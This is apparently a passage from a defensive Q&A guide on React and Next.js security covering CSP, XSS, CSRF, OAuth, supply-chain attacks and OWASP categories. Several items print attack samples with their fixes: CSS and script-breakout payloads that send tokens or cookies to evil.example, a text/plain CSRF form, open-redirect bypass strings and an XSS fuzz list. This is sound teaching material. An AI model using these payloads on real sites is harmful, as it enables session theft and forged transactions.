A nonce must be unique for each response. If a page is statically generated or cached, every user would get the same HTML with the same nonce, so the nonce would be public and useless. Next.js therefore needs to render pages with nonces per request, which means you lose static optimization and CDN caching for those pages. Teams sometimes accept this only for sensitive pages, or use hash-based or `'self'`-only policies for static pages.

## 309: How do inline style attributes from SSR interact with a strict style-src?

When React renders `style={{ color: 'red' }}` on the client, it sets the style through the CSSOM (`element.style`), which CSP does not block. But during SSR, React writes `style="color:red"` into the HTML. A `style-src` without `'unsafe-inline'` blocks style attributes in parsed HTML, so the server-rendered styles are dropped until hydration fixes them, which causes layout flashes.

Options are: avoid inline styles in SSR (use classes or CSS variables set from CSS files), add `'unsafe-hashes'` with the specific hashes, or accept `'unsafe-inline'` for styles only, which is a much smaller risk than for scripts.

## 310: How can CSS injection be used to steal data?

If an attacker can inject CSS, they can use attribute selectors with background images to send data to their server one character at a time:

```css
input[name="csrf"][value^="a"] {
  background: url(https://evil.example/?c=a);
}
input[name="csrf"][value^="b"] {
  background: url(https://evil.example/?c=b);
}
```

They can also hide content, fake UI and track users. Defenses: never allow raw user CSS, restrict `img-src` and `style-src` in CSP, and keep secrets like CSRF tokens out of attributes where CSS can see them when possible.

## 311: How can prototype pollution lead to XSS in a React app?

If some code merges user JSON into objects without care (deep merge, query string parsers), an attacker can set `__proto__.something`, which adds a property to every object. If a component later spreads an options object, or a library reads a property like `dangerouslySetInnerHTML`, `src` or a template option from an object that doesn't define it, it may get the polluted value.

Defenses: use safe merge functions that skip `__proto__`, `constructor` and `prototype`; create objects with `Object.create(null)` for maps; validate input with schemas that strip unknown keys; and keep libraries updated, since many had pollution bugs.

## 312: How can parsing nested query strings into props cause problems?

Libraries like `qs` turn `?filter[a]=1` into nested objects. If you pass the parsed result straight into components or API calls, users can add unexpected keys, arrays instead of strings, or very deep nesting. A component that does `<Table {...filters} />` may receive props like `dangerouslySetInnerHTML`, and an API call may send `{"role":"admin"}`. Parse query strings with a schema and pass only known fields.

## 313: How do you safely support user-configured component layouts, like a dashboard builder?

Treat the layout config as untrusted data:

- Map component names to an allowlist of components.
- Validate each component's props with a schema per component.
- Never allow raw HTML, CSS strings or URLs without validation.
- Limit nesting depth and number of items to avoid denial of service.
- Check on the server that the user can access the data sources referenced in the config.

```tsx
const registry = {
  chart: { C: Chart, schema: ChartProps },
  note: { C: Note, schema: NoteProps },
} as const;
```

## 314: Show how a script tag breakout works in SSR state and how to fix it.

```js
const state = {
  user: {
    bio: '</script><script>fetch("//evil.example?c="+document.cookie)</script>',
  },
};

// Vulnerable
html += `<script>window.__STATE__=${JSON.stringify(state)}</script>`;
```

The HTML parser sees `</script>` in the string and ends the script tag early; the rest becomes a new script. JSON escaping doesn't help because the HTML parser runs before JavaScript.

```js
// Fixed
const safe = JSON.stringify(state).replace(/</g, "\\u003c");
html += `<script>window.__STATE__=${safe}</script>`;
```

`<` is still `<` for JavaScript, but the HTML parser never sees a tag. Frameworks like Next.js do this escaping for you.

## 315: What is the risk with getServerSideProps returning whole objects in the Next.js Pages Router?

Everything returned in `props` is serialized into the `__NEXT_DATA__` script on the page and into JSON files fetched on client navigation. If you return a full user record or an API response, every field is visible in the page source, even if the component only shows a name. Map to the fields the page needs. The same rule applies to loaders in React Router and to Client Component props in the App Router.

## 316: How can you inspect what an RSC page sends to the browser?

Open DevTools and look at the page source for `self.__next_f.push(...)` chunks on the first load, and at network requests with the `RSC: 1` header on client navigations. These contain the Flight payload: the serialized tree, including all props passed to Client Components. Search it for field names like `email`, `passwordHash`, `token` or internal IDs. Doing this during review catches leaks that are invisible in the UI.

## 317: How does Next.js protect variables captured in Server Action closures?

If you define an action inside a Server Component and it uses variables from the outer scope, Next.js has to send those values to the client and back. It encrypts them with a key generated per build (or from `NEXT_SERVER_ACTIONS_ENCRYPTION_KEY` when you run several instances), so the client can't read or change them.

You still should not rely on this for sensitive data: values pass through the client, the key could leak, and the action can be replayed. Pass IDs and look up data and permissions inside the action instead.

## 318: How are Server Actions exposed as endpoints, and what does that mean for security?

Each action gets an ID, and the client calls it with a POST to the page URL with a `Next-Action` header holding that ID. Next.js removes unused actions from the build and uses IDs that are hard to guess and change between builds. But an action used by any client code is in the bundle, so its ID is public.

So treat every action like a public POST endpoint: check auth, check permissions on each resource, validate inputs, rate-limit expensive ones, and never assume it is only called from your form.

## 319: How does Next.js protect Server Actions against CSRF, and what are the limits?

Actions can only be called with POST, and Next.js compares the `Origin` header with the `Host` (or `X-Forwarded-Host`) and rejects mismatches, plus `allowedOrigins` you configure. Together with `SameSite=Lax` cookies, this blocks normal cross-site form attacks.

Limits: a subdomain you don't control that is in `allowedOrigins`, or a proxy that sets wrong host headers, can weaken it. Route handlers (`route.ts`) don't get this check automatically, so they need their own CSRF protection when they use cookies.

## 320: What lessons does React2Shell teach about RSC security?

React2Shell (CVE-2025-55182) was a flaw in how React's server packages deserialized Flight data sent to Server Function endpoints, allowing remote code execution with a crafted request. Key lessons:

- An RSC app is a server, with a server's attack surface, even if you never wrote an API.
- The app could be vulnerable even without any Server Functions, as long as it supported RSC.
- Patch quickly: fixed in React 19.0.1, 19.1.2 and 19.2.1, with follow-up DoS fixes released later, and patched Next.js versions.
- Use a WAF or platform protections as an extra layer, track advisories and have a fast deploy process for security updates.

## 321: What did the Next.js middleware bypass (CVE-2025-29927) teach about auth checks?

In early 2025, a bug let attackers skip Next.js middleware by sending a crafted internal header (`x-middleware-subrequest`). Apps that only checked auth in middleware were fully exposed. The lesson: middleware (now `proxy.ts`) is good for redirects and quick checks, but authorization must also be checked where data is read or changed, in the data access layer, Server Actions and route handlers. Defense in depth means one bypass doesn't open everything.

## 322: Why is checking auth only in a Next.js layout not enough?

Layouts don't re-render on every navigation between their child pages, so a check there may not run for each page. Pages and layouts can also render in parallel, so a page might fetch data before the layout's redirect happens. And Server Actions and route handlers don't go through layouts at all. Put the check close to the data: in the page or, better, in the data access functions that every page and action calls.

## 323: How do you use experimental_taintUniqueValue to protect a secret?

```ts
import "server-only";
import { experimental_taintUniqueValue } from "react";

const apiKey = process.env.PAYMENT_API_KEY!;
experimental_taintUniqueValue(
  "Do not pass the payment API key to the client.",
  process,
  apiKey,
);
```

The second argument is the object whose lifetime controls the taint; `process` means "forever". If any code passes this exact string as a prop to a Client Component, React throws with the message. Use `experimental_taintObjectReference` for whole objects like user rows.

## 324: What are the limits of React's taint APIs?

- They are experimental and need a flag in Next.js.
- They track exact values or object references. A copy, a substring, a different object with the same fields or a value derived from the secret is not tainted.
- They only stop data from going through React's server-to-client serialization. They don't stop you from logging the value, returning it from a route handler, or sending it in an API response.

They are a guard rail on top of good practices like DTOs and `server-only`, not a replacement.

## 325: Describe an IDOR bug in a React and Server Components app and how to fix it.

IDOR (Insecure Direct Object Reference) is when the app loads a record by an ID from the user without checking that the user may access it.

```tsx
// app/invoices/[id]/page.tsx
export default async function Page({
  params,
}: {
  params: Promise<{ id: string }>;
}) {
  const { id } = await params;
  const invoice = await db.invoice.findUnique({ where: { id } }); // any user's invoice!
  return <InvoiceView invoice={invoice} />;
}
```

Fix it by scoping the query to the current user or tenant in the data layer:

```ts
const user = await requireUser();
const invoice = await db.invoice.findFirst({
  where: { id, orgId: user.orgId },
});
if (!invoice) notFound();
```

Random IDs (UUIDs) make guessing harder but are not access control.

## 326: How can caching leak one user's data to another in SSR or RSC apps?

If a page or function that depends on the current user is cached as if it were shared, the first user's data may be served to others. Examples: a CDN caching an SSR page with personal data, a shared `fetch` cache or `'use cache'` function that reads cookies inside but isn't keyed by user, or a server-side in-memory cache keyed only by URL.

Fixes: send `Cache-Control: private, no-store` on personal pages; keep user identity out of shared caches, or include the user ID in cache keys; read cookies and headers outside cached functions and pass them in as arguments; and test by logging in as two users.

## 327: What is the token handler or BFF pattern for OIDC in SPAs and why is it recommended?

A backend component (the BFF or "token handler") runs the OIDC code flow as a confidential client with its own secret, stores access and refresh tokens on the server, and gives the SPA only a `__Host-`, httpOnly, `SameSite=Strict` session cookie. API calls go through the BFF, which adds the access token.

The IETF "OAuth 2.0 for Browser-Based Applications" guidance recommends this for apps with sensitive data, because tokens never reach JavaScript, so XSS can't take them away to use elsewhere. You still need CSRF protection and XSS prevention, since an attacker running script in the page can still use the session while it's open.

## 328: Why is keeping tokens in memory not a complete defense against XSS?

If an attacker runs code in your page, they don't need the token itself. They can call your API with `fetch` from inside the page, read data shown in the DOM, change forms, or wait for the app to call `getAccessTokenSilently` and grab the result by patching `fetch`. Memory storage only stops them from taking the token away to use later. That helps, but the real fix is preventing XSS and using CSP so injected code can't run.

## 329: How do you protect refresh tokens used directly in the browser?

- Use refresh token rotation with reuse detection.
- Give refresh tokens a short absolute lifetime and an idle timeout.
- Bind them to the client with DPoP if your provider supports it.
- Prefer storing them in httpOnly cookies set by your own backend, or use a BFF.
- Revoke them on logout and password change.

Identity providers usually set stricter rules for SPA refresh tokens than for confidential clients for this reason.

## 330: What is DPoP and how does it help SPAs?

DPoP (Demonstrating Proof of Possession, RFC 9449) binds tokens to a key pair that the client holds. The SPA creates a non-extractable key with Web Crypto, and for each request it signs a small JWT (the DPoP proof) with the HTTP method, URL and time. The server checks that the token is bound to that key. A stolen token alone is useless without the private key, which XSS can use but not export. It raises the bar but doesn't stop attacks that run inside the page.

## 331: How does blocking third-party cookies affect silent authentication in SPAs?

Older SPAs refreshed tokens by loading the identity provider in a hidden iframe with `prompt=none`, which relied on the provider's session cookie. When the provider is on a different site (like `tenant.auth0.com`), browsers that block third-party cookies (Safari, Firefox, and Chrome in some modes) don't send that cookie, so silent auth fails and users get logged out. Solutions: use refresh tokens with rotation, use a custom domain for the identity provider on the same site (like `login.example.com`), or use a BFF.

## 332: How do you prevent multiple tabs from refreshing the token at the same time?

With refresh token rotation, two tabs refreshing at once can trigger reuse detection and log the user out. Use the Web Locks API so only one tab refreshes, and share the result.

```js
async function refreshWithLock() {
  return navigator.locks.request("token-refresh", async () => {
    const cached = await readFreshTokenFromSharedPlace();
    if (cached) return cached;
    const token = await callRefreshEndpoint();
    broadcastNewToken(token); // e.g. BroadcastChannel
    return token;
  });
}
```

Some providers also allow a short grace period for reused refresh tokens to handle these races.

## 333: How should the OAuth callback page be secured?

- Validate `state` (and PKCE) before doing anything.
- Exchange the code right away and remove `code` and `state` from the URL with `history.replaceState`, so they don't stay in history or leak through `Referer`.
- Don't load third-party scripts or images on the callback page.
- Set `Referrer-Policy: no-referrer` or `strict-origin` there.
- Redirect only to a validated, same-origin `returnTo`.
- Register exact redirect URIs in the identity provider, with no wildcards.

## 334: What does an OIDC library check on the ID token, and what remains your job?

The library checks the signature (using the provider's keys), `iss` (issuer), `aud` (your client ID), `exp`, `iat`, `nonce`, and sometimes `azp`. Your job: use the ID token only to know who logged in, not to call APIs; have APIs validate their own access tokens (issuer, audience, scopes, expiry); and decide permissions on the server from claims you trust, not from values the client sends.

## 335: How do you handle the redirect result in MSAL to avoid broken or insecure logins?

With redirect login, MSAL must process the response when the app loads. `MsalProvider` calls `handleRedirectPromise` for you; if you use `msal-browser` directly, call `await instance.initialize()` and then `await instance.handleRedirectPromise()` once, before rendering protected UI or making other MSAL calls. Set the active account from the result. Calling login again while a redirect is being processed causes `interaction_in_progress` errors. Keep `redirectUri` pointing to a simple page so tokens in the URL aren't exposed to heavy third-party scripts.

## 336: What should you expose in the Auth.js session callback?

The `session` callback controls what `useSession()` and `auth()` return, and `useSession()` data reaches the browser. Expose only what the UI needs: user ID, name, image, maybe roles.

```ts
callbacks: {
  async jwt({ token, user }) {
    if (user) token.role = user.role;
    return token;
  },
  async session({ session, token }) {
    session.user.id = token.sub!;
    session.user.role = token.role as string;
    return session;
  },
}
```

Don't put the provider's access or refresh token into the session unless the client really needs it; keep them in the encrypted JWT and use them only on the server.

## 337: How can a misconfigured OAuth redirect URI lead to account takeover?

If the identity provider allows wildcard or loosely matched redirect URIs (like `https://*.example.com/*`), an attacker can start a login with a redirect URI on a subdomain or path they control (such as a hijacked subdomain or a user-content page). The provider sends the authorization code there, and the attacker uses it. PKCE helps when the attacker can't get the verifier, but with the implicit flow or weak setups it leads to token theft. Register exact URIs only.

## 338: How can an open redirect be chained with OAuth to steal codes or tokens?

If the registered redirect URI is `https://app.example.com/callback` and the app has an open redirect at `/go?url=`, an attacker might register or abuse a flow so that the code lands on a page that forwards the full URL (including the code or fragment) to the attacker's site. Browsers keep the fragment across redirects, which made the implicit flow especially vulnerable. Fix open redirects, use the code flow with PKCE, use exact redirect URIs, and send `Referrer-Policy` on callback pages.

## 339: What tricks do attackers use to bypass naive open redirect checks?

- `//evil.com` (protocol-relative, looks like a path).
- `/\evil.com` (browsers treat `\` like `/`).
- `https:evil.com` or `https:/evil.com`.
- `https://app.example.com.evil.com` (fails a `startsWith` check).
- `https://app.example.com@evil.com` (user info part).
- Encoded forms like `%2F%2Fevil.com`, and tabs or newlines in the scheme.

Parsing with `new URL(value, location.origin)` and comparing `url.origin` handles all of these because it follows the browser's own parsing rules.

## 340: When can SameSite cookies be bypassed for CSRF?

- **Same-site is not same-origin**: `evil.example.com` and `app.example.com` are the same site, so a compromised subdomain can send `SameSite=Strict` cookies.
- **GET requests that change data**: `Lax` sends cookies on top-level GET navigations.
- **Chrome's Lax+POST window**: cookies without an explicit `SameSite` are sent on top-level POSTs for two minutes after being set.
- **Client-side redirects or gadgets** on your own site that make requests on behalf of the attacker.
- `SameSite=None` cookies.

That is why OWASP still recommends CSRF tokens or origin checks for sensitive actions, along with `SameSite`.

## 341: How can CSRF still work against a JSON API?

Attackers can't send `application/json` cross-site without a preflight. But if the server accepts JSON with `Content-Type: text/plain`, a form or `fetch` with `mode: 'no-cors'` can send a body that parses as JSON:

```html
<form
  method="POST"
  action="https://api.example.com/transfer"
  enctype="text/plain"
>
  <input name='{"to":"attacker","amount":1000,"x":"' value='"}' />
</form>
```

Fix: require `Content-Type: application/json` and reject others, require a custom header or CSRF token, check `Origin`, and use `SameSite` cookies.

## 342: What are common CORS misconfigurations that create real vulnerabilities?

- Reflecting any `Origin` back with `Access-Control-Allow-Credentials: true`, which lets any site read users' private data.
- Allowing `Origin: null`, which sandboxed iframes and `data:` pages can send.
- Weak checks like `origin.endsWith('example.com')`, which match `evilexample.com`.
- Trusting all subdomains when some host user content.
- Allowing `http://` origins for an HTTPS API.

Use an exact allowlist on the server, and test with curl using a fake `Origin` header.

## 343: Are api.example.com and app.example.com "cross-site" or "cross-origin"?

They are cross-origin (different hosts), so CORS applies to `fetch` calls between them. But they are same-site (same registrable domain), so `SameSite=Lax` and `Strict` cookies are sent. This is why many teams put the API on a subdomain: cookies work with `SameSite=Lax`, while CORS still needs `credentials: 'include'` and a correct `Access-Control-Allow-Origin`. It also means any other subdomain is "same-site" and should be trusted only as much as your main app.

## 344: How should clickjacking protection work if your app must be embedded by partners?

Use CSP `frame-ancestors` with an exact list of partner origins instead of turning protection off:

```
Content-Security-Policy: frame-ancestors 'self' https://partner-a.com https://partner-b.com
```

`X-Frame-Options` can't list several origins, so rely on `frame-ancestors`. If the partner list is per customer, set the header per request from a database of allowed origins. Also review which pages need to be embeddable, and keep login and payment pages un-embeddable. Cookies in embedded third-party contexts need `SameSite=None; Secure` (and maybe `Partitioned`), which needs extra CSRF care.

## 345: How do you secure an OAuth popup login that uses postMessage?

The popup sends the result to `window.opener`. Both sides must check origins.

```js
// Popup (on your own callback page)
window.opener?.postMessage({ type: "auth:done" }, "https://app.example.com");
window.close();

// Opener
window.addEventListener("message", (e) => {
  if (e.origin !== "https://app.example.com" || e.source !== popupRef) return;
  if (e.data?.type === "auth:done") refreshSession();
});
```

Don't send tokens through `postMessage` if you can avoid it; signal completion and get the session from your server. Check origins with `===`, not `includes` or `startsWith`.

## 346: How does COOP affect OAuth and payment popups?

`Cross-Origin-Opener-Policy: same-origin` cuts the `window.opener` link to cross-origin windows. If your app opens a popup on the identity provider and the provider's page sends COOP `same-origin`, the popup and your app lose their connection, so `postMessage` and `popup.closed` checks stop working. Use `same-origin-allow-popups` on your app if you rely on popups you open, and test login, payment and SSO flows after adding COOP.

## 347: How do you safely show fully untrusted user HTML, like user-built landing pages?

Sanitizing complex HTML is hard to get perfect, so isolate it on another origin:

- Serve the content from a separate domain, like `usercontent-example.net` (a different site, not just a subdomain).
- Embed it with `<iframe sandbox="allow-scripts" src="https://usercontent-example.net/p/123">`.
- Give that origin no cookies or access to your APIs.
- Communicate through `postMessage` with strict origin and data checks.

This is how platforms like Google, GitHub and CodePen show untrusted content.

## 348: What did recent npm supply chain attacks teach React teams?

In 2025, attackers phished npm maintainers and published malicious versions of very popular packages (like `chalk` and `debug`) that tried to steal crypto in the browser. A self-spreading worm (Shai-Hulud) stole npm and cloud tokens from developer machines and CI, then used them to publish infected versions of more packages.

Lessons: use lockfiles and `npm ci`; delay adopting brand-new versions; disable install scripts by default; keep CI secrets minimal and scoped; use phishing-resistant 2FA and trusted publishing for your own packages; and watch for unexpected new versions in lockfile diffs.

## 349: What is npm provenance and trusted publishing?

Provenance links a published npm package to the source commit and CI workflow that built it, using signed attestations (Sigstore). Trusted publishing lets CI publish with short-lived OIDC credentials instead of long-lived npm tokens, so there's no token to steal. As a consumer, `npm audit signatures` checks registry signatures and provenance attestations of installed packages. A package that suddenly loses provenance in a new version is a warning sign.

## 350: How can a minimum release age protect you from malicious packages?

Most malicious versions are detected and removed within hours or days. If your tools refuse versions published in the last few days, you skip most of these attacks. pnpm has a `minimumReleaseAge` setting, and Renovate has `minimumReleaseAge` for update PRs. The trade-off is waiting a bit longer for real security fixes, which you can allow manually.

## 351: How do pnpm and npm handle dependency install scripts differently?

npm runs `preinstall`, `install` and `postinstall` scripts of all dependencies by default, unless you pass `--ignore-scripts` or set it in `.npmrc`. pnpm v10 doesn't run dependency lifecycle scripts by default; you list the packages allowed to run them (`onlyBuiltDependencies` in config, or `pnpm approve-builds`). Turning scripts off by default removes the most common way malicious packages run code on install.

## 352: How would you detect unexpected network calls added by a dependency to your bundle?

- Use a strict `connect-src` in CSP with reporting; new destinations show up as violations.
- Review bundle analyzer output for new large or unknown modules after updates.
- Run E2E tests that fail on requests to unknown domains (Playwright `page.route` or request logging).
- Use tools like Socket that flag new network access in package versions.
- Monitor production with CSP reports or client-side script monitoring tools.

## 353: What are the limits of SRI for third-party scripts?

SRI needs a fixed file. Many vendor scripts (analytics, chat, payment) change often at the same URL, so a hash would break them, and vendors often don't support it. Those scripts also load more scripts dynamically that SRI doesn't cover. In those cases, use CSP to limit where scripts can come from, choose vendors carefully, and keep sensitive pages (like checkout) with as few third-party scripts as possible. PCI DSS 4.0 requires an inventory and integrity checks of scripts on payment pages.

## 354: Should you self-host third-party scripts instead of loading them from a CDN?

Self-hosting a fixed version removes the risk of the CDN or vendor changing the code, lets you use `'self'` in CSP, and avoids an extra DNS and TLS connection. The downside is you must update it yourself, and some vendors don't allow it or need the latest version. For libraries (like a date picker), bundling via npm is better. For SaaS scripts (analytics, chat), follow the vendor's rules but limit them with CSP and keep them off sensitive pages.

## 355: How can you limit what a third-party script can do in your page?

Fully sandboxing a third-party script in the main page is hard. Options:

- Load the widget in a cross-origin iframe instead of a script on your page.
- Run some scripts in a web worker (tools like Partytown do this), which cuts direct DOM access.
- Restrict `connect-src` so it can only talk to the vendor.
- Use `Permissions-Policy` to turn off features like camera and payment.
- Load the script only on pages that need it.

## 356: How can errors during streaming SSR leak information?

With streaming, the shell is sent first and later chunks fill in Suspense boundaries. If a component throws on the server, React sends a signal for the client to render that boundary and handle the error. In development, error messages and stacks are included to help debugging. In production builds, React and frameworks replace them with generic messages and digests. Make sure production builds really run in production mode, and never put secrets or raw query errors into error messages you throw on purpose.

## 357: How should a React app and its API agree on error responses?

Use a consistent, safe error format like RFC 9457 Problem Details:

```json
{
  "type": "https://example.com/errors/validation",
  "title": "Invalid input",
  "status": 400,
  "errors": { "email": "Invalid email" },
  "traceId": "a1b2c3"
}
```

The API sends a short message, field errors for forms, and a trace ID, and logs the details server side. The React app shows `title` or field messages and the trace ID for support. It never shows raw `error.message` from unknown sources, which might contain SQL or stack traces.

## 358: How do browser extensions affect your app's security, and what can you do?

Extensions with page access can read and change your DOM, read form values and intercept requests. You can't stop a malicious extension on the user's own machine. What you can do: keep sensitive data out of the DOM when not needed, use httpOnly cookies, rely on server checks for anything important, and expect DOM changes you didn't make (which can also cause hydration errors and CSP report noise). For very high-risk actions, use step-up auth with passkeys, which extensions can't fake.

## 359: How can React DevTools reveal data the user shouldn't see?

If the server sends a list of users with emails and the UI only shows names, DevTools shows the emails in props. If a feature flag object includes unreleased features or other customers' names, it's visible. If an admin-only component is rendered but hidden with CSS, its props are visible. The fix is data minimization on the server: shape API responses and RSC props per user and per screen, and don't render hidden components with private data.

## 360: Why is exposing the store on window, like window.store, a problem?

Developers sometimes attach stores, clients or services to `window` for debugging. In production, this gives any script, including injected ones or browser extensions, a simple way to read all state and dispatch actions, such as triggering an "approve" action or getting tokens from an API client. Remove these globals in production builds and keep debugging helpers behind development-only checks.

## 361: Can secrets stay in memory after logout, and does it matter?

JavaScript can't wipe strings from memory; the garbage collector frees them at some point, and heap snapshots or memory dumps could show them earlier. For normal web apps this is a low risk, since an attacker who can read process memory has already won. The practical steps are dropping references (set to `null`, clear stores and caches), reloading the page after logout, and keeping long-lived secrets out of the browser in the first place.

## 362: What does a full security testing strategy for a React app look like?

- **Unit tests**: sanitizers, URL validators, permission helpers with attack payloads.
- **Component tests**: XSS payloads rendered as text, guards redirect correctly.
- **E2E tests**: access control through the API for each role, logout clears data.
- **SAST**: ESLint security rules, Semgrep or CodeQL in CI.
- **SCA**: `npm audit`, Dependabot, Socket or Snyk.
- **Secret scanning**: gitleaks and GitHub push protection.
- **DAST**: ZAP baseline scans on staging.
- **Header checks** and CSP reports in production.
- **Pen tests** before big releases.

## 363: Write a simple Semgrep rule that flags unsanitized dangerouslySetInnerHTML.

```yaml
rules:
  - id: react-dangerously-set-inner-html-without-sanitize
    languages: [javascript, typescript]
    severity: ERROR
    message: Sanitize HTML with DOMPurify before using dangerouslySetInnerHTML.
    patterns:
      - pattern: <$EL dangerouslySetInnerHTML={{__html: $X}} />
      - pattern-not: <$EL dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(...)}} />
```

The rule is a starting point. It will miss cases where sanitizing happens in a variable, so pair it with a `SafeHtml` component and a lint ban elsewhere.

## 364: How do you fuzz a URL validator or sanitizer?

Run it against a large list of known attack payloads and random variations, and assert on the result.

```ts
const payloads = [
  "javascript:alert(1)",
  "JaVaScRiPt:alert(1)",
  " javascript:alert(1)",
  "java\tscript:alert(1)",
  "\u0001javascript:alert(1)",
  "data:text/html,<script>alert(1)</script>",
  "//evil.com",
  "/\\evil.com",
  "https:evil.com",
];

test.each(payloads)("blocks %s", (p) => {
  expect(safeHref(p)).toBe("#");
});
```

Use public lists like PayloadsAllTheThings, and property-based tools like fast-check to create variations.

## 365: How would you threat model a new React feature?

Ask four simple questions: what are we building, what can go wrong, what are we going to do about it, and did we do a good job. For a feature like "comments with links":

- Data flow: user input, API, database, other users' browsers.
- Threats: stored XSS, malicious links, spam, IDOR on edit and delete, large payloads.
- Controls: render as text or sanitize, validate URLs, add `rel` attributes, server auth checks per comment, rate limits, size limits.
- Tests for each control.

Spend more time on features that touch auth, payments, user HTML or file uploads.

## 366: How does OWASP A01 Broken Access Control show up in React apps?

- Admin routes protected only by a route guard.
- Buttons hidden by role while the API doesn't check the role.
- APIs that accept `userId` or `orgId` from the request body instead of the session.
- IDOR: loading `/api/orders/123` without an ownership check.
- Server Actions without auth checks.
- Prefetching or caching data for routes the user can't access.

The fix is always server-side checks based on the authenticated session, with the UI reflecting them.

## 367: How does OWASP A05 Injection apply to the front end?

In React apps, injection is mostly XSS: user data reaching `dangerouslySetInnerHTML`, refs with `innerHTML`, URL sinks, `eval`, unsafe markdown or third-party widgets. It also includes injection into other contexts the front end builds: query strings and API paths (path traversal), CSS, and server-side template or query building in SSR code and Server Actions (SQL or NoSQL injection, if inputs go into raw queries).

## 368: How does OWASP A02 Security Misconfiguration apply to React apps?

- Missing or weak CSP and security headers.
- Permissive CORS.
- Public source maps and debug builds.
- Default config in auth libraries (like dev secrets or wildcard redirect URIs).
- Verbose error pages.
- Exposed `.env`, `.git` or backup files on the server.
- Storybook or preview deployments open to everyone.

Automate checks for these in CI and on deployed environments.

## 369: How does OWASP A03 Software Supply Chain Failures apply to React apps?

React apps depend on hundreds of npm packages, build tools, CDN scripts and CI actions. Failures include using packages with known vulnerabilities, installing malicious or typosquatted packages, compromised maintainer accounts, unpinned GitHub Actions, and third-party scripts loaded without integrity checks. Controls include lockfiles, `npm ci`, SCA tools, delayed updates, disabled install scripts, SRI, pinned CI actions by commit SHA and minimal CI secrets.

## 370: How does OWASP A04 Cryptographic Failures relate to front-end code?

- Using HTTP instead of HTTPS anywhere.
- "Encrypting" data in localStorage with a key that is also in the bundle.
- Using `Math.random` for tokens, IDs or PKCE values instead of `crypto.getRandomValues` or `crypto.randomUUID`.
- Writing your own crypto instead of using Web Crypto.
- Keeping sensitive data in JWT payloads, which are only encoded.
- Weak TLS settings on the server or CDN.

## 371: How does OWASP A07 Authentication Failures show up in SPAs?

- Long-lived tokens in localStorage.
- No refresh token rotation or revocation.
- Logout that only clears client state.
- No rate limiting or bot protection on login (server side).
- User enumeration in login and reset messages.
- Weak password rules or no MFA for sensitive accounts.
- Session IDs or tokens in URLs.

Using a well-known identity provider and its official SDK removes many of these issues, but token storage and logout remain the app's job.

## 372: How does OWASP A08 Software or Data Integrity Failures apply?

It covers trusting code or data without checking its integrity: loading CDN scripts without SRI, auto-updating dependencies without review, CI/CD pipelines that anyone can change, unsigned builds, and deserializing untrusted data (like the RSC deserialization bug). For React apps: use SRI where possible, protect build pipelines and deploy keys, review lockfile changes and keep framework server packages patched.

## 373: How does OWASP A09 Security Logging and Alerting Failures apply to React apps?

The front end can't log security events reliably by itself, but it can help: report CSP violations, send client errors with trace IDs, and log failed auth flows. The main logging must be on the server: logins, failed logins, permission denials, admin actions, token reuse detection. The failure is having no alerts when these spike. Also make sure logs don't store tokens or personal data.

## 374: How does OWASP A10 Mishandling of Exceptional Conditions show up in React code?

It is about failing in an unsafe way when something unexpected happens. Examples:

- A route guard that shows the page when the auth check throws (fail open).
- `catch` blocks that set `isAdmin = true` as a default, or ignore a failed permission check.
- Showing raw errors with internal details.
- A broken token refresh that leaves the app in a half-logged-in state with stale data.

Fail closed: on errors, treat the user as unauthenticated or unauthorized and show a safe message.

## 375: How does OWASP A06 Insecure Design show up in front-end features?

Insecure design is a flaw in the plan, not in the code. Examples: calculating prices, discounts or totals in the browser and sending them to the server; password reset that relies on hidden form fields; a "secret" admin URL as the only protection; multi-step flows where the server doesn't check that earlier steps were done; and features that need a secret in the client to work. These can't be fixed with better code alone; the design must move trust to the server.

## 376: A tester changes the price in a checkout request and pays 1 dollar for a 500 dollar order. How do you fix it?

The design trusts the client with the price. Fix it on the server:

- The client sends only product IDs, quantities and a coupon code.
- The server loads prices from the database, applies discounts, taxes and shipping, and creates the payment amount itself.
- The payment provider's session is created server side with that amount, and the order is confirmed only from the provider's webhook.

The React app can still show a calculated total for UX, but the server must ignore any price fields sent by the client.

## 377: A user changes /invoices/1001 to /invoices/1002 in the URL and sees another customer's invoice. What do you do?

This is IDOR. Steps:

1. Fix the API or data layer so every invoice query is scoped to the user's organization or ownership, and return 404 when it doesn't match.
2. Search for the same pattern in other endpoints (orders, files, users).
3. Add automated tests that log in as user A and request user B's resources.
4. Check access logs to see if it was abused, and follow your incident and disclosure process.

Changing to random IDs alone is not a fix; the access check is.

## 378: A stored XSS is found in comment rendering in production. How do you respond?

1. **Contain**: ship a fix that renders comments as text or sanitizes them; if that takes time, hide comments or turn the feature off.
2. **Clean**: find stored payloads in the database and sanitize or remove them.
3. **Assess**: check logs for who was affected and what the payload did (token theft, API calls).
4. **Recover**: revoke sessions and tokens if they may have been stolen; rotate exposed secrets.
5. **Prevent**: add CSP if missing, a lint rule, a regression test with the payload, and review similar features.
6. **Communicate** with users and follow legal requirements if data was exposed.

## 379: A secret API key was found in your production JavaScript bundle. What do you do?

1. Rotate or revoke the key immediately at the provider; it must be treated as public.
2. Check the provider's logs for misuse and costs.
3. Move the calls that need it to a server endpoint that holds the key.
4. Remove it from the code and env config, and from git history if it was committed (but rotation is what matters).
5. Add secret scanning in CI and on the build output, and review how the variable got a client prefix.

## 380: How would you migrate an app from tokens in localStorage to httpOnly cookies?

1. Add server endpoints for login, refresh and logout that set and clear httpOnly, `Secure`, `SameSite` cookies (or add a BFF).
2. Update the API to accept the cookie (or have the BFF add the bearer token), and add CSRF protection.
3. Configure CORS with credentials and an exact origin list if the API is on another origin.
4. Change the client: remove token storage, use `credentials: 'include'`, and change the 401 handler to call the refresh endpoint.
5. On first load after the release, read the old localStorage token once, swap it for a cookie session (or just require login), and delete it.
6. Remove the old code path after users have migrated.

## 381: How would you add a CSP to a legacy React app that has inline scripts and many third-party tools?

1. Inventory: list all scripts, styles, fonts, frames and API domains.
2. Start with `Content-Security-Policy-Report-Only` and a report endpoint.
3. Move inline scripts into files or give them nonces or hashes; remove inline event handlers.
4. Add `object-src 'none'` and `base-uri 'none'` early, since they rarely break things.
5. Fix or replace libraries that need `eval`.
6. Tighten `script-src` with nonces and `'strict-dynamic'`; keep `style-src 'unsafe-inline'` for now if CSS-in-JS needs it.
7. Enforce on a small part of traffic or on less critical pages first, then everywhere, and keep watching reports.

## 382: Design a markdown preview feature for user posts that is secure.

- Store markdown, not HTML.
- Render with `react-markdown`, which produces React elements; don't enable raw HTML, or add `rehype-raw` only with `rehype-sanitize`.
- Use a custom `a` component that validates URLs, adds `rel="noopener noreferrer nofollow ugc"` and shows the real domain.
